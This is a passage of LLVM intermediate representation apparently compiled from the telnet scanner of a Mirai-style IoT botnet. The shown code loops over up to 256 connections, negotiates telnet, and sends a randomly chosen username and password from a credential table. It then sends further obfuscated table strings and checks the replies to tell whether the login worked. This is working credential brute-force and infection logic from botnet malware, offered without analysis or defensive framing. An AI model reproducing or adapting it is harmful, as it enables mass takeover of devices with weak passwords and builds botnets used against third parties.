  %499 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %498, i32 0, i32 1
  %500 = load i32, i32* %499, align 8
  store i32 %500, i32* %12, align 4
  br label %501

501:                                              ; preds = %497, %476
  br label %534

502:                                              ; preds = %471
  %503 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %504 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %503, i32 0, i32 3
  %505 = load i32, i32* %504, align 8
  %506 = icmp ne i32 %505, 0
  br i1 %506, label %507, label %533

507:                                              ; preds = %502
  %508 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %509 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %508, i32 0, i32 1
  %510 = load i32, i32* %509, align 8
  %511 = srem i32 %510, 64
  %512 = zext i32 %511 to i64
  %513 = shl i64 1, %512
  %514 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %5, i32 0, i32 0
  %515 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %516 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %515, i32 0, i32 1
  %517 = load i32, i32* %516, align 8
  %518 = sdiv i32 %517, 64
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds [16 x i64], [16 x i64]* %514, i64 0, i64 %519
  %521 = load i64, i64* %520, align 8
  %522 = or i64 %521, %513
  store i64 %522, i64* %520, align 8
  %523 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %524 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %523, i32 0, i32 1
  %525 = load i32, i32* %524, align 8
  %526 = load i32, i32* %11, align 4
  %527 = icmp sgt i32 %525, %526
  br i1 %527, label %528, label %532

528:                                              ; preds = %507
  %529 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %530 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %529, i32 0, i32 1
  %531 = load i32, i32* %530, align 8
  store i32 %531, i32* %11, align 4
  br label %532

532:                                              ; preds = %528, %507
  br label %533

533:                                              ; preds = %532, %502
  br label %534

534:                                              ; preds = %533, %501
  br label %535

535:                                              ; preds = %534, %470
  %536 = load i32, i32* %1, align 4
  %537 = add nsw i32 %536, 1
  store i32 %537, i32* %1, align 4
  br label %413, !llvm.loop !48

538:                                              ; preds = %413
  %539 = getelementptr inbounds %struct.timeval.22, %struct.timeval.22* %8, i32 0, i32 1
  store i64 0, i64* %539, align 8
  %540 = getelementptr inbounds %struct.timeval.22, %struct.timeval.22* %8, i32 0, i32 0
  store i64 1, i64* %540, align 8
  %541 = load i32, i32* %12, align 4
  %542 = load i32, i32* %11, align 4
  %543 = icmp sgt i32 %541, %542
  br i1 %543, label %544, label %546

544:                                              ; preds = %538
  %545 = load i32, i32* %12, align 4
  br label %548

546:                                              ; preds = %538
  %547 = load i32, i32* %11, align 4
  br label %548

548:                                              ; preds = %546, %544
  %549 = phi i32 [ %545, %544 ], [ %547, %546 ]
  %550 = add nsw i32 1, %549
  %551 = call i32 @select(i32 noundef %550, %struct.fd_set.21* noundef %5, %struct.fd_set.21* noundef %6, %struct.fd_set.21* noundef null, %struct.timeval.22* noundef %8)
  store i32 %551, i32* %13, align 4
  %552 = call i64 @time(i64* noundef null) #7
  %553 = trunc i64 %552 to i32
  store i32 %553, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %554

554:                                              ; preds = %973, %548
  %555 = load i32, i32* %1, align 4
  %556 = icmp slt i32 %555, 256
  br i1 %556, label %557, label %976

557:                                              ; preds = %554
  %558 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %559 = load i32, i32* %1, align 4
  %560 = sext i32 %559 to i64
  %561 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %558, i64 %560
  store %struct.scanner_connection* %561, %struct.scanner_connection** %7, align 8
  %562 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %563 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %562, i32 0, i32 1
  %564 = load i32, i32* %563, align 8
  %565 = icmp eq i32 %564, -1
  br i1 %565, label %566, label %567

566:                                              ; preds = %557
  br label %973

567:                                              ; preds = %557
  %568 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %6, i32 0, i32 0
  %569 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %570 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %569, i32 0, i32 1
  %571 = load i32, i32* %570, align 8
  %572 = sdiv i32 %571, 64
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds [16 x i64], [16 x i64]* %568, i64 0, i64 %573
  %575 = load i64, i64* %574, align 8
  %576 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %577 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %576, i32 0, i32 1
  %578 = load i32, i32* %577, align 8
  %579 = srem i32 %578, 64
  %580 = zext i32 %579 to i64
  %581 = shl i64 1, %580
  %582 = and i64 %575, %581
  %583 = icmp ne i64 %582, 0
  br i1 %583, label %584, label %615

584:                                              ; preds = %567
  store i32 0, i32* %29, align 4
  store i32 0, i32* %30, align 4
  store i32 4, i32* %31, align 4
  %585 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %586 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %585, i32 0, i32 1
  %587 = load i32, i32* %586, align 8
  %588 = bitcast i32* %29 to i8*
  %589 = call i32 @getsockopt(i32 noundef %587, i32 noundef 1, i32 noundef 4, i8* noundef %588, i32* noundef %31) #7
  store i32 %589, i32* %30, align 4
  %590 = load i32, i32* %29, align 4
  %591 = icmp eq i32 %590, 0
  br i1 %591, label %592, label %603

592:                                              ; preds = %584
  %593 = load i32, i32* %30, align 4
  %594 = icmp eq i32 %593, 0
  br i1 %594, label %595, label %603

595:                                              ; preds = %592
  %596 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %597 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %596, i32 0, i32 3
  store i32 2, i32* %597, align 8
  %598 = call %struct.scanner_auth* @random_auth_entry()
  %599 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %600 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %599, i32 0, i32 0
  store %struct.scanner_auth* %598, %struct.scanner_auth** %600, align 8
  %601 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %602 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %601, i32 0, i32 6
  store i32 0, i32* %602, align 4
  br label %614

603:                                              ; preds = %592, %584
  %604 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %605 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %604, i32 0, i32 1
  %606 = load i32, i32* %605, align 8
  %607 = call i32 @close(i32 noundef %606)
  %608 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %609 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %608, i32 0, i32 1
  store i32 -1, i32* %609, align 8
  %610 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %611 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %610, i32 0, i32 8
  store i8 0, i8* %611, align 8
  %612 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %613 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %612, i32 0, i32 3
  store i32 0, i32* %613, align 8
  br label %973

614:                                              ; preds = %595
  br label %615

615:                                              ; preds = %614, %567
  %616 = getelementptr inbounds %struct.fd_set.21, %struct.fd_set.21* %5, i32 0, i32 0
  %617 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %618 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %617, i32 0, i32 1
  %619 = load i32, i32* %618, align 8
  %620 = sdiv i32 %619, 64
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds [16 x i64], [16 x i64]* %616, i64 0, i64 %621
  %623 = load i64, i64* %622, align 8
  %624 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %625 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %624, i32 0, i32 1
  %626 = load i32, i32* %625, align 8
  %627 = srem i32 %626, 64
  %628 = zext i32 %627 to i64
  %629 = shl i64 1, %628
  %630 = and i64 %623, %629
  %631 = icmp ne i64 %630, 0
  br i1 %631, label %632, label %972

632:                                              ; preds = %615
  br label %633

633:                                              ; preds = %970, %632
  %634 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %635 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %634, i32 0, i32 3
  %636 = load i32, i32* %635, align 8
  %637 = icmp eq i32 %636, 0
  br i1 %637, label %638, label %639

638:                                              ; preds = %633
  br label %971

639:                                              ; preds = %633
  %640 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %641 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %640, i32 0, i32 6
  %642 = load i32, i32* %641, align 4
  %643 = icmp eq i32 %642, 256
  br i1 %643, label %644, label %656

644:                                              ; preds = %639
  %645 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %646 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %645, i32 0, i32 7
  %647 = getelementptr inbounds [256 x i8], [256 x i8]* %646, i64 0, i64 0
  %648 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %649 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %648, i32 0, i32 7
  %650 = getelementptr inbounds [256 x i8], [256 x i8]* %649, i64 0, i64 0
  %651 = getelementptr inbounds i8, i8* %650, i64 64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* align 8 %647, i8* align 1 %651, i64 192, i1 false)
  %652 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %653 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %652, i32 0, i32 6
  %654 = load i32, i32* %653, align 4
  %655 = sub nsw i32 %654, 64
  store i32 %655, i32* %653, align 4
  br label %656

656:                                              ; preds = %644, %639
  %657 = call i32* @__errno_location() #8
  store i32 0, i32* %657, align 4
  %658 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %659 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %658, i32 0, i32 1
  %660 = load i32, i32* %659, align 8
  %661 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %662 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %661, i32 0, i32 7
  %663 = getelementptr inbounds [256 x i8], [256 x i8]* %662, i64 0, i64 0
  %664 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %665 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %664, i32 0, i32 6
  %666 = load i32, i32* %665, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds i8, i8* %663, i64 %667
  %669 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %670 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %669, i32 0, i32 6
  %671 = load i32, i32* %670, align 4
  %672 = sub nsw i32 256, %671
  %673 = call i32 @recv_strip_null(i32 noundef %660, i8* noundef %668, i32 noundef %672, i32 noundef 16384)
  store i32 %673, i32* %32, align 4
  %674 = load i32, i32* %32, align 4
  %675 = icmp eq i32 %674, 0
  br i1 %675, label %676, label %678

676:                                              ; preds = %656
  %677 = call i32* @__errno_location() #8
  store i32 104, i32* %677, align 4
  store i32 -1, i32* %32, align 4
  br label %678

678:                                              ; preds = %676, %656
  %679 = load i32, i32* %32, align 4
  %680 = icmp eq i32 %679, -1
  br i1 %680, label %681, label %711

681:                                              ; preds = %678
  %682 = call i32* @__errno_location() #8
  %683 = load i32, i32* %682, align 4
  %684 = icmp ne i32 %683, 11
  br i1 %684, label %685, label %710

685:                                              ; preds = %681
  %686 = call i32* @__errno_location() #8
  %687 = load i32, i32* %686, align 4
  %688 = icmp ne i32 %687, 11
  br i1 %688, label %689, label %710

689:                                              ; preds = %685
  %690 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %691 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %690, i32 0, i32 1
  %692 = load i32, i32* %691, align 8
  %693 = call i32 @close(i32 noundef %692)
  %694 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %695 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %694, i32 0, i32 1
  store i32 -1, i32* %695, align 8
  %696 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %697 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %696, i32 0, i32 8
  %698 = load i8, i8* %697, align 8
  %699 = add i8 %698, 1
  store i8 %699, i8* %697, align 8
  %700 = zext i8 %699 to i32
  %701 = icmp sge i32 %700, 10
  br i1 %701, label %702, label %707

702:                                              ; preds = %689
  %703 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %704 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %703, i32 0, i32 8
  store i8 0, i8* %704, align 8
  %705 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %706 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %705, i32 0, i32 3
  store i32 0, i32* %706, align 8
  br label %709

707:                                              ; preds = %689
  %708 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %708)
  br label %709

709:                                              ; preds = %707, %702
  br label %710

710:                                              ; preds = %709, %685, %681
  br label %971

711:                                              ; preds = %678
  %712 = load i32, i32* %32, align 4
  %713 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %714 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %713, i32 0, i32 6
  %715 = load i32, i32* %714, align 4
  %716 = add nsw i32 %715, %712
  store i32 %716, i32* %714, align 4
  %717 = load i32, i32* @fake_time, align 4
  %718 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %719 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %718, i32 0, i32 2
  store i32 %717, i32* %719, align 4
  br label %720

720:                                              ; preds = %969, %711
  store i32 0, i32* %33, align 4
  %721 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %722 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %721, i32 0, i32 3
  %723 = load i32, i32* %722, align 8
  switch i32 %723, label %935 [
    i32 2, label %724
    i32 3, label %732
    i32 4, label %759
    i32 5, label %786
    i32 6, label %806
    i32 7, label %826
    i32 8, label %846
    i32 9, label %866
    i32 10, label %886
  ]

724:                                              ; preds = %720
  %725 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %726 = call i32 @consume_iacs(%struct.scanner_connection* noundef %725)
  store i32 %726, i32* %33, align 4
  %727 = icmp sgt i32 %726, 0
  br i1 %727, label %728, label %731

728:                                              ; preds = %724
  %729 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %730 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %729, i32 0, i32 3
  store i32 3, i32* %730, align 8
  br label %731

731:                                              ; preds = %728, %724
  br label %936

732:                                              ; preds = %720
  %733 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %734 = call i32 @consume_user_prompt(%struct.scanner_connection* noundef %733)
  store i32 %734, i32* %33, align 4
  %735 = icmp sgt i32 %734, 0
  br i1 %735, label %736, label %758

736:                                              ; preds = %732
  %737 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %738 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %737, i32 0, i32 1
  %739 = load i32, i32* %738, align 8
  %740 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %741 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %740, i32 0, i32 0
  %742 = load %struct.scanner_auth*, %struct.scanner_auth** %741, align 8
  %743 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %742, i32 0, i32 0
  %744 = load i8*, i8** %743, align 8
  %745 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %746 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %745, i32 0, i32 0
  %747 = load %struct.scanner_auth*, %struct.scanner_auth** %746, align 8
  %748 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %747, i32 0, i32 4
  %749 = load i8, i8* %748, align 4
  %750 = zext i8 %749 to i64
  %751 = call i64 @send(i32 noundef %739, i8* noundef %744, i64 noundef %750, i32 noundef 16384)
  %752 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %753 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %752, i32 0, i32 1
  %754 = load i32, i32* %753, align 8
  %755 = call i64 @send(i32 noundef %754, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %756 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %757 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %756, i32 0, i32 3
  store i32 4, i32* %757, align 8
  br label %758

758:                                              ; preds = %736, %732
  br label %936

759:                                              ; preds = %720
  %760 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %761 = call i32 @consume_pass_prompt(%struct.scanner_connection* noundef %760)
  store i32 %761, i32* %33, align 4
  %762 = icmp sgt i32 %761, 0
  br i1 %762, label %763, label %785

763:                                              ; preds = %759
  %764 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %765 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %764, i32 0, i32 1
  %766 = load i32, i32* %765, align 8
  %767 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %768 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %767, i32 0, i32 0
  %769 = load %struct.scanner_auth*, %struct.scanner_auth** %768, align 8
  %770 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %769, i32 0, i32 1
  %771 = load i8*, i8** %770, align 8
  %772 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %773 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %772, i32 0, i32 0
  %774 = load %struct.scanner_auth*, %struct.scanner_auth** %773, align 8
  %775 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %774, i32 0, i32 5
  %776 = load i8, i8* %775, align 1
  %777 = zext i8 %776 to i64
  %778 = call i64 @send(i32 noundef %766, i8* noundef %771, i64 noundef %777, i32 noundef 16384)
  %779 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %780 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %779, i32 0, i32 1
  %781 = load i32, i32* %780, align 8
  %782 = call i64 @send(i32 noundef %781, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  %783 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %784 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %783, i32 0, i32 3
  store i32 5, i32* %784, align 8
  br label %785

785:                                              ; preds = %763, %759
  br label %936

786:                                              ; preds = %720
  %787 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %788 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %787)
  store i32 %788, i32* %33, align 4
  %789 = icmp sgt i32 %788, 0
  br i1 %789, label %790, label %805

790:                                              ; preds = %786
  call void @table_unlock_val(i8 noundef zeroext 5)
  %791 = call i8* @table_retrieve_val(i32 noundef 5, i32* noundef %35)
  store i8* %791, i8** %34, align 8
  %792 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %793 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %792, i32 0, i32 1
  %794 = load i32, i32* %793, align 8
  %795 = load i8*, i8** %34, align 8
  %796 = load i32, i32* %35, align 4
  %797 = sext i32 %796 to i64
  %798 = call i64 @send(i32 noundef %794, i8* noundef %795, i64 noundef %797, i32 noundef 16384)
  %799 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %800 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %799, i32 0, i32 1
  %801 = load i32, i32* %800, align 8
  %802 = call i64 @send(i32 noundef %801, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 5)
  %803 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %804 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %803, i32 0, i32 3
  store i32 6, i32* %804, align 8
  br label %805

805:                                              ; preds = %790, %786
  br label %936

806:                                              ; preds = %720
  %807 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %808 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %807)
  store i32 %808, i32* %33, align 4
  %809 = icmp sgt i32 %808, 0
  br i1 %809, label %810, label %825

810:                                              ; preds = %806
  call void @table_unlock_val(i8 noundef zeroext 6)
  %811 = call i8* @table_retrieve_val(i32 noundef 6, i32* noundef %37)
  store i8* %811, i8** %36, align 8
  %812 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %813 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %812, i32 0, i32 1
  %814 = load i32, i32* %813, align 8
  %815 = load i8*, i8** %36, align 8
  %816 = load i32, i32* %37, align 4
  %817 = sext i32 %816 to i64
  %818 = call i64 @send(i32 noundef %814, i8* noundef %815, i64 noundef %817, i32 noundef 16384)
  %819 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %820 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %819, i32 0, i32 1
  %821 = load i32, i32* %820, align 8
  %822 = call i64 @send(i32 noundef %821, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 6)
  %823 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %824 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %823, i32 0, i32 3
  store i32 7, i32* %824, align 8
  br label %825

825:                                              ; preds = %810, %806
  br label %936

826:                                              ; preds = %720
  %827 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %828 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %827)
  store i32 %828, i32* %33, align 4
  %829 = icmp sgt i32 %828, 0
  br i1 %829, label %830, label %845

830:                                              ; preds = %826
  call void @table_unlock_val(i8 noundef zeroext 4)
  %831 = call i8* @table_retrieve_val(i32 noundef 4, i32* noundef %39)
  store i8* %831, i8** %38, align 8
  %832 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %833 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %832, i32 0, i32 1
  %834 = load i32, i32* %833, align 8
  %835 = load i8*, i8** %38, align 8
  %836 = load i32, i32* %39, align 4
  %837 = sext i32 %836 to i64
  %838 = call i64 @send(i32 noundef %834, i8* noundef %835, i64 noundef %837, i32 noundef 16384)
  %839 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %840 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %839, i32 0, i32 1
  %841 = load i32, i32* %840, align 8
  %842 = call i64 @send(i32 noundef %841, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 4)
  %843 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %844 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %843, i32 0, i32 3
  store i32 8, i32* %844, align 8
  br label %845

845:                                              ; preds = %830, %826
  br label %936

846:                                              ; preds = %720
  %847 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %848 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %847)
  store i32 %848, i32* %33, align 4
  %849 = icmp sgt i32 %848, 0
  br i1 %849, label %850, label %865

850:                                              ; preds = %846
  call void @table_unlock_val(i8 noundef zeroext 7)
  %851 = call i8* @table_retrieve_val(i32 noundef 7, i32* noundef %41)
  store i8* %851, i8** %40, align 8
  %852 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %853 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %852, i32 0, i32 1
  %854 = load i32, i32* %853, align 8
  %855 = load i8*, i8** %40, align 8
  %856 = load i32, i32* %41, align 4
  %857 = sext i32 %856 to i64
  %858 = call i64 @send(i32 noundef %854, i8* noundef %855, i64 noundef %857, i32 noundef 16384)
  %859 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %860 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %859, i32 0, i32 1
  %861 = load i32, i32* %860, align 8
  %862 = call i64 @send(i32 noundef %861, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 7)
  %863 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %864 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %863, i32 0, i32 3
  store i32 9, i32* %864, align 8
  br label %865

865:                                              ; preds = %850, %846
  br label %936

866:                                              ; preds = %720
  %867 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %868 = call i32 @consume_any_prompt(%struct.scanner_connection* noundef %867)
  store i32 %868, i32* %33, align 4
  %869 = icmp sgt i32 %868, 0
  br i1 %869, label %870, label %885

870:                                              ; preds = %866
  call void @table_unlock_val(i8 noundef zeroext 8)
  %871 = call i8* @table_retrieve_val(i32 noundef 8, i32* noundef %43)
  store i8* %871, i8** %42, align 8
  %872 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %873 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %872, i32 0, i32 1
  %874 = load i32, i32* %873, align 8
  %875 = load i8*, i8** %42, align 8
  %876 = load i32, i32* %43, align 4
  %877 = sext i32 %876 to i64
  %878 = call i64 @send(i32 noundef %874, i8* noundef %875, i64 noundef %877, i32 noundef 16384)
  %879 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %880 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %879, i32 0, i32 1
  %881 = load i32, i32* %880, align 8
  %882 = call i64 @send(i32 noundef %881, i8* noundef getelementptr inbounds ([3 x i8], [3 x i8]* @.str.15, i64 0, i64 0), i64 noundef 2, i32 noundef 16384)
  call void @table_lock_val(i8 noundef zeroext 8)
  %883 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %884 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %883, i32 0, i32 3
  store i32 10, i32* %884, align 8
  br label %885

885:                                              ; preds = %870, %866
  br label %936

886:                                              ; preds = %720
  %887 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %888 = call i32 @consume_resp_prompt(%struct.scanner_connection* noundef %887)
  store i32 %888, i32* %33, align 4
  %889 = load i32, i32* %33, align 4
  %890 = icmp eq i32 %889, -1
  br i1 %890, label %891, label %912

891:                                              ; preds = %886
  %892 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %892, i32 0, i32 1
  %894 = load i32, i32* %893, align 8
  %895 = call i32 @close(i32 noundef %894)
  %896 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %897 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %896, i32 0, i32 1
  store i32 -1, i32* %897, align 8
  %898 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %899 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %898, i32 0, i32 8
  %900 = load i8, i8* %899, align 8
  %901 = add i8 %900, 1
  store i8 %901, i8* %899, align 8
  %902 = zext i8 %901 to i32
  %903 = icmp eq i32 %902, 10
  br i1 %903, label %904, label %909

904:                                              ; preds = %891
  %905 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %906 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %905, i32 0, i32 8
  store i8 0, i8* %906, align 8
  %907 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %908 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %907, i32 0, i32 3
  store i32 0, i32* %908, align 8
  br label %911

909:                                              ; preds = %891
  %910 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* noundef %910)
  br label %911

911:                                              ; preds = %909, %904
  br label %934

912:                                              ; preds = %886
  %913 = load i32, i32* %33, align 4
  %914 = icmp sgt i32 %913, 0
  br i1 %914, label %915, label %933

915:                                              ; preds = %912
  %916 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %917 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %916, i32 0, i32 4
  %918 = load i32, i32* %917, align 4
  %919 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %920 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %919, i32 0, i32 5
  %921 = load i16, i16* %920, align 8
  %922 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
